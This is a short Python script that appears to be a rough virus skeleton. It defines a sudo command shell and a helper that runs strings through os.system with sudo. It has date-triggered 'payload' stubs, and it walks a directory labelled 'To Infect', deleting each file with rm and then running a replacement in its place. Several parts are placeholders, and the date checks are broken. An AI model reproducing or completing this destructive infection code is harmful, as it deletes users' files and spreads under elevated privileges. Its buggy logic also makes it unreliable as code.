from datetime import datetime
from os import walk
import os

def startshell():
  while True:
    torun = input(">>")
    if torun == "exit":
      break
    else:
      os.system("sudo " + torun)
def run(command):
  os.system("sudo " + command)

if datetime.now().month == "11":
  #payload 1
  pass
if (datetime.today().weekday() == 5):
  if datetime.now().today == 13:
     #payload 2
     pass

path = " To Infect "
fileLocation = " file location "
f = []
for (dirpath, dirnames, filenames) in walk(path):
    f.extend(filenames)
    break
for i in range(len(f)) :
  run("rm " + path + f[i])
  run(fileLocation + path + f[i] + ".py")
